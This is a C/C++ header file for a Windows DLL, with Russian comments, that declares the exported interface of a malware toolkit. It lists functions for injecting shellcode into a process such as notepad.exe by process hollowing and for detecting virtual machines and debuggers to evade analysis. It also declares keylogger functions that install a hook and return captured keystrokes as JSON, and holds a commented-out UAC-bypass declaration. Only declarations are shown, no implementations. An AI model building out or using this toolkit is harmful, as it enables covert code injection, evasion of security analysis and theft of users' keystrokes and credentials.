#ifndef INJECTOR_H
#define INJECTOR_H

#include <windows.h>

// Макрос для экспорта функций из DLL
#define EXPORT_FUNC extern "C" __declspec(dllexport)

/**
 * @brief Выполняет инъекцию шеллкода в указанный процесс с использованием техники Process Hollowing.
 *
 * @param targetProcessPath Полный путь к исполняемому файлу целевого процесса (например, "C:\\Windows\\System32\\notepad.exe").
 * @param shellcode Указатель на буфер с шеллкодом.
 * @param shellcodeSize Размер буфера с шеллкодом в байтах.
 * @param errorMsg Указатель на указатель char*, куда будет помещен адрес строки с сообщением об ошибке 
 *                 (если произошла ошибка). Вызывающая сторона ДОЛЖНА освободить эту память с помощью free_error_message().
 * @return int 0 в случае успеха, ненулевое значение (код ошибки Windows или кастомный код) в случае ошибки.
 */
EXPORT_FUNC int inject_process_hollowing(
    LPCSTR targetProcessPath, 
    const unsigned char* shellcode, 
    DWORD shellcodeSize,
    char** errorMsg
);

/**
 * @brief Освобождает память, выделенную для сообщения об ошибке функцией inject_process_hollowing.
 *
 * @param errorMsg Указатель на строку с сообщением об ошибке, полученный от inject_process_hollowing.
 */
EXPORT_FUNC void free_error_message(char* errorMsg);

// Функция для проверки на виртуальное окружение
EXPORT_FUNC BOOL IsVMEnvironmentDetected();

// Функция для проверки наличия отладчика
EXPORT_FUNC BOOL IsDebuggerPresentDetected();

// Функция для UAC Bypass через Token Duplication и запуска команды (ОСТАВЛЕНО ЗАКОММЕНТИРОВАННЫМ ПОЛЬЗОВАТЕЛЕМ)
// EXPORT_FUNC int BypassUACAndExecute(const char* commandLineAnsi, char** errorMsg);

// --- Функции Кейлоггера ---

// Запускает кейлоггер (устанавливает хук и запускает поток обработки сообщений)
// Возвращает 0 при успехе, иначе код ошибки.
// errorMsg будет содержать сообщение об ошибке (требует free_error_message).
EXPORT_FUNC int StartKeylogger(char** errorMsg);

// Останавливает кейлоггер (снимает хук и останавливает поток)
// Возвращает 0 при успехе, иначе код ошибки.
EXPORT_FUNC int StopKeylogger(char** errorMsg);

// Возвращает накопленные логи в виде JSON-массива строк.
// Возвращает NULL, если логов нет или произошла ошибка.
// Вызывающая сторона ДОЛЖНА освободить возвращенную строку с помощью free_error_message.
EXPORT_FUNC char* GetKeyLogs();

#endif // INJECTOR_H 